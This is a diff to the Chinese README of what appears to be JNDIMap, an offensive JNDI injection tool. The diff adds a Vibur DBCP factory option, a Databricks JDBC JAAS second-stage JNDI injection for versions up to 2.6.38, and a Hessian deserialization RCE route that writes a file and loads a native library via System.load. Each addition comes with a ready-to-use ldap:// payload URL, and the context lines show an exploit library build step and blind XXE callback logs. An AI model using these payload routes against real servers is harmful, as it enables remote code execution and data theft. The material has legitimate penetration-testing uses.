@@ -294,6 +294,7 @@ gcc -shared -fPIC exp.c -o exp.so
 - Tomcat JDBC
 - Alibaba Druid
 - HikariCP
+- Vibur DBCP
 
 需要将 URL 中的 `Factory` 替换为如下内容之一
 
@@ -304,6 +305,7 @@ gcc -shared -fPIC exp.c -o exp.so
 - TomcatJDBC
 - Druid
 - HikariCP
+- Vibur
 
 *因为 Alibaba Druid 的 DruidDataSourceFactory 并不支持配置 breakAfterAcquireFailure 和 connectionErrorRetryAttempts 参数, 在默认情况下, 如果 JDBC 连接失败, 则会在创建的新线程中陷入无限重试, 这可能会使得控制台死循环不断输出报错信息, 导致日志爆炸等问题, 非必要条件不建议使用. 参考: [https://github.com/alibaba/druid/issues/3772](https://github.com/alibaba/druid/issues/3772)*
 
@@ -480,6 +482,15 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 `-h`: 显示 Usage 信息
 
+### Databricks
+
+通过 Databricks JDBC 驱动的 JAAS 配置实现二次 JNDI 注入 (版本 <= 2.6.38)
+
+```bash
+# JNDI 注入
+ldap://127.0.0.1:1389/Factory/Databricks/JNDI/<url>
+```
+
 ## Tomcat Blind XXE
 
 利用 `org.apache.catalina.users.MemoryUserDatabaseFactory` 实现无回显 XXE
@@ -501,6 +512,22 @@ ldap://127.0.0.1:1389/TomcatXXE/<base64-url-encoded-path>
 [HTTP] Receive request: /TsBaggdL.dtd
 [HTTP] Receive request: /V4J4ZH1P?content=helloworld
 ```
+
+## Hessian RCE
+
+利用 `com.caucho.hessian.client.HessianProxyFactory` 实现 Hessian 反序列化 RCE
+
+反序列化部分使用 UIDefaults + ProxyLazyValue 依次触发下列 Gadget:
+
+- 任意文件写: `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename`
+- 动态库加载: `java.lang.System.load`
+
+```bash
+# Hessian RCE
+ldap://127.0.0.1:1389/Hessian/<interface>/LoadLibrary/<path-to-native-library>
+```
+
+注意该路由需要指定 `interface` 以设置动态代理的接口类, 服务端在 JNDI 查询之后必须存在调用该接口任意方法的逻辑, 否则不会触发反序列化
 
 ## LDAP Deserialization
 
